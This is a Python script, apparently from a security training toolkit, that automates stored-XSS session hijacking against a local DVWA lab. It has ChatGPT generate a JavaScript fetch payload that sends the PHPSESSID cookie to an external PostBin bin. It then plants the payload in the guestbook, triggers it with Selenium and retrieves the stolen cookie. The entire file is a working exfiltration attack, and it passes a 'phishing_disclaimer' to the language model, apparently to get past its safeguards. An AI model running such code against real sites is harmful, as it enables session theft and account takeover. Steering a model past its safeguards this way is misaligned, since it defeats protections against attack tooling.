"""
Identifying and Exploiting XSS Vulnerabilities with ChatGPT
Data Exfiltration and Session Hijacking
['Utilize ChatGPT to automate the creation of scripts for data exfiltration through XSS vulnerabilities.', 
'Apply ChatGPT to generate payloads for session hijacking, focusing on stealth and efficiency.', 
'Implement ChatGPT to develop strategies for bypassing same-origin policies and other browser security mechanisms.', 
'Use ChatGPT to simulate attacks and test the robustness of session management and data handling practices.']
This script is for training purposes only
"""
import requests
import sys
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, "..", "class")
sys.path.append(class_dir)
from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func

class PointlessAI_data_exfiltration_and_session_hijacking(DVWA_Session,ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self) 
        General_Func.__init__(self)

    def fetch_requests(self, postbin_id, s):
        # URL to fetch the requests made to the given PostBin ID
        url = f"https://www.toptal.com/developers/postbin/api/bin/{postbin_id}/req/shift"
        print(url)
        response = s.get(url)

        # Check if the request was successful
        # Extract the logs or requests data
        requests_data = response.text
        print(f"Requests made to PostBin ID {postbin_id}:")
        print(requests_data)
        return requests_data
    
    def xss_data_exfiltration_script(self, url, s, payload):
        # Post to Stored XSS page
        xss_data = {
            'txtName': 'Thankyou for your session id',
            'mtxMessage': payload,
            'btnSign': 'Sign+Guestbook'
        }

        #response = self.post_dvwa(s, url, xss_data)
        response = s.post(url, xss_data)
        return response

    def generate_session_hijacking_payload(self):
        # Generate payload for session hijacking
        # Create GET bin at https://www.toptal.com/developers/postbin
        response = requests.post("https://www.toptal.com/developers/postbin/api/bin")
        postbin_id = ""
        if response.status_code == 201:
            data = response.json()
            postbin_id = data.get('binId')
            print(postbin_id)
        else: print(response.status_code)
        payload_content = self.red_team_query(
            f"Create a stored xss payload to send the cookie PHPSESSID via the data parameter using js fetch api to https://www.toptal.com/developers/postbin/{postbin_id}?data=",
            f"{self.phishing_disclaimer},{self.no_markdown}"
        )
        return postbin_id, payload_content

def main():
    ai = PointlessAI_data_exfiltration_and_session_hijacking() # Instantiate class
    # Start session
    with requests.Session() as s:
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.get_constants())
        _ = ai.login_to_dvwa(s, ai.get_constants(), 'admin', 'password', user_token)

        # Begin testing for Data Exfiltration and Session Hijacking
        url = "http://127.0.0.1/vulnerabilities/xss_s/"

        # Generate payload
        postbin_id, payload = ai.generate_session_hijacking_payload()
        print(payload)
        print(postbin_id)
        
        # Test Data Exfiltration through XSS
        response = ai.xss_data_exfiltration_script(url, s, payload)
        print(response)

        # Run through selenium test
        phpsessid = s.cookies.get('PHPSESSID', None)
        print(phpsessid)

        cookie_name = 'PHPSESSID'
        cookie_value = phpsessid
        url, response = ai.selenium_test(url, cookie_name, cookie_value)

        # Get postbin response to check success
        ai.fetch_requests(postbin_id, s)

        
if __name__ == "__main__":
    main()